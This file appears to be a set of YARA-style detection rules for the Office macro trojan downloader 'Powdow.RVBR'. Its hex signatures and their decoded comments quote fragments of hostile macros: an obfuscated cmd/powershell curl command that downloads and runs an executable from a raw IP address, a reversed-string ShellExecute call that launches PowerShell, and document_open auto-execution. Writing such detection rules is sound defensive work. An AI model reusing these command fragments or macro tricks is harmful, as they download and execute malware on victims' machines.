
rule TrojanDownloader_O97M_Powdow_RVBR_MTB{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,02 00 02 00 02 00 00 01 00 "
		
	strings :
		$a_01_0 = {72 65 70 6c 61 63 65 28 22 63 6d 64 2f 63 70 6f 77 5e 79 78 64 6f 35 71 65 35 72 73 5e 68 79 78 64 6f 35 71 65 35 6c 6c 2f 77 30 31 63 5e 75 5e 72 6c 68 74 74 5e 70 3a 2f 2f 31 39 35 2e 32 30 31 2e 31 30 31 2e 31 34 36 2f 31 32 33 34 31 72 67 79 78 64 6f 35 71 65 35 72 67 67 34 33 35 67 34 74 72 2e 79 78 64 6f 35 71 65 35 5e 78 79 78 64 6f 35 71 65 35 2d 6f 22 26 73 64 34 30 26 22 3b 22 26 73 64 34 30 2c 22 79 78 64 6f 35 71 65 35 22 2c 22 65 22 29 77 72 31 64 66 6d 2e 65 78 65 } //01 00  replace("cmd/cpow^yxdo5qe5rs^hyxdo5qe5ll/w01c^u^rlhtt^p://195.201.101.146/12341rgyxdo5qe5rgg435g4tr.yxdo5qe5^xyxdo5qe5-o"&sd40&";"&sd40,"yxdo5qe5","e")wr1dfm.exe
		$a_01_1 = {64 6f 63 75 6d 65 6e 74 5f 6f 70 65 6e 28 29 } //00 00  document_open()
	condition:
		any of ($a_*)
 
}
rule TrojanDownloader_O97M_Powdow_RVBR_MTB_2{
	meta:
		description = "TrojanDownloader:O97M/Powdow.RVBR!MTB,SIGNATURE_TYPE_MACROHSTR_EXT,03 00 03 00 03 00 00 01 00 "
		
	strings :
		$a_01_0 = {53 68 65 6c 6c 45 78 65 63 75 74 65 28 31 2c 20 53 74 72 52 65 76 65 72 73 65 28 22 6e 65 70 4f 22 29 2c 20 53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e 6c 6c 65 68 73 72 65 77 6f 70 22 29 } //01 00  ShellExecute(1, StrReverse("nepO"), StrReverse("exe.llehsrewop")
		$a_03_1 = {53 74 72 52 65 76 65 72 73 65 28 22 65 78 65 2e 90 02 0a 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 65 78 65 2e 72 65 72 6f 6c 70 78 65 3b 65 78 65 2e 90 02 0a 5c 70 6d 65 54 5c 73 77 6f 64 6e 69 57 5c 3a 43 20 6f 2d 20 65 78 65 2e 90 02 19 2f 6e 69 6d 64 61 2d 78 6d 61 74 7a 2f 6d 6f 63 2e 6e 72 75 74 71 65 74 2f 2f 3a 73 70 74 74 68 90 00 } //01 00 
		$a_01_2 = {44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 43 72 69 74 69 63 61 6c 48 61 6e 64 6c 65 5a 65 72 6f 4f 72 4d 69 6e 75 73 4f 6e 65 49 73 49 6e 76 61 6c 69 64 } //00 00  潄畣敭瑮佟数⡮ഩ䌊楲楴慣䡬湡汤婥牥佯䵲湩獵湏䥥䥳癮污摩
	condition:
		any of ($a_*)
 
}